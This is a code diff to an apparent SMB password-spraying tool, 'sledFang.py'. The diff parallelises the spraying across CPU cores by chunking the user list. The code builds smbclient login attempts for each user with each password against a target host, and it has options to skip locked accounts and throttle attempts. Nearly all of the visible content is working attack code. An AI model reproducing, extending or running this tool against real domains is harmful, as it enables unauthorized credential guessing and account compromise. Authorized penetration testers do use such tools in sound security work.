@@ -16,6 +16,24 @@
 # python3 sledFang.py -d domain -U userlist.txt -P passwordlist.txt -t 127.0.0.1 -o output.txt
 
 import subprocess, argparse, time, multiprocessing
+# from datetime import datetime
+from functools import partial
+
+
+# startTime = datetime.now()
+
+
+# chunk the user list so it can run in parallel while spraying
+def chunkUsers(seq, num):
+    avg = len(seq) / float(num)
+    out = []
+    last = 0.0
+
+    while last < len(seq):
+        out.append(seq[int(last):int(last + avg)])
+        last += avg
+
+    return out
 
 
 def write_output(user, password, output):
@@ -54,24 +72,30 @@ def printColor(color_input, color):
 
 # this function allows the user spraying to be multi-threaded
 def user_attack(user_list, domain, target_ip, output, bypass, verbose, very_verbose, password, user_list_clean,
-                temp_users, threading, rate_limit):
-    # create a pool and limit processes 
+                temp_users, rate_limit):
+
+    # check number of cpus
+    cpus = multiprocessing.cpu_count()
+    # check if rate limiting is enabled
     if rate_limit > 0:
         time.sleep(rate_limit)
-        pool = multiprocessing.Pool(processes=1)
-    else:
-        pool = multiprocessing.Pool(processes=threading)
+        cpus = 1
+
+    # create a pool and chunk the user list based on the number of cores, setup the command for the map function
+    pool = multiprocessing.Pool(processes=cpus)
+    chunked_user_list = chunkUsers(user_list, cpus)
+    user_command = partial(attack, domain, target_ip, output, bypass, verbose, very_verbose, password, user_list_clean,
+                           temp_users)
 
     # run the for loop attack using the threaded rules
-    for user in user_list:
-        pool.apply_async(attack, args=(
-            domain, target_ip, output, bypass, verbose, very_verbose, user, password, user_list_clean, temp_users,))
+    for user in chunked_user_list:
+        pool.map_async(user_command, user)
     pool.close()
     pool.join()
 
 
 # this function is the actual password attack
-def attack(domain, target_ip, output, bypass, verbose, very_verbose, user, password, user_list_clean, temp_users):
+def attack(domain, target_ip, output, bypass, verbose, very_verbose, password, user_list_clean, temp_users, user):
     # build the command line argument for smbclient
     arguments = 'smbclient -U "%s\%s%%%s" -L %s' % (domain, user, password, target_ip)
     # print command if verbosity is turned on
@@ -146,8 +170,7 @@ def attack(domain, target_ip, output, bypass, verbose, very_verbose, user, passw
 
 
 # this function takes all the command line arguments and starts the spraying attack
-def sprayer(domain, user_list, password_list, target_ip, output, bypass, rate_limit, delay, verbose, very_verbose,
-            threading):
+def sprayer(domain, user_list, password_list, target_ip, output, bypass, rate_limit, delay, verbose, very_verbose):
     # loop through each set of passwords, spraying each user
     print("Running")
     # remove the new line character from the users
@@ -169,11 +192,11 @@ def sprayer(domain, user_list, password_list, target_ip, output, bypass, rate_li
         # update the user_list based on found passwords or locked accounts
         user_list = temp_users[:]
         user_attack(user_list, domain, target_ip, output, bypass, verbose, very_verbose, password, user_list_clean,
-                    temp_users, threading, rate_limit)
+                    temp_users, rate_limit)
     print("Complete")
 
 
-def main():
+if __name__ == '__main__':
     # parse input for variables
     parser = argparse.ArgumentParser(description='SMB Password Sprayer')
     parser.add_argument('-d', '--domain', help='Domain name')
@@ -188,7 +211,7 @@ def main():
     parser.add_argument('-b', '--bypass', action='store_true', help='Bypass locked accounts')
     parser.add_argument('-v', '--verbose', action='store_true', help='Show Responses')
     parser.add_argument('-V', '--very_verbose', action='store_true', help='Show Requests and Responses')
-    parser.add_argument('-T', '--threading', help='Set number of parallel threads to spray')
+
     args = parser.parse_args()
 
     # set list of users
@@ -235,12 +258,6 @@ def main():
     else:
         output = None
 
-    # set threading limit
-    if args.threading is not None:
-        threading = int(args.threading)
-    else:
-        threading = 4
-
     # bypass boolean
     bypass = args.bypass
 
@@ -249,7 +266,5 @@ def main():
     very_verbose = args.very_verbose
 
     # run the program
-    sprayer(domain, users, passwords, target, output, bypass, rate_limit, delay, verbose, very_verbose, threading)
-
-
-main()
+    sprayer(domain, users, passwords, target, output, bypass, rate_limit, delay, verbose, very_verbose)
+    # print(datetime.now() - startTime)
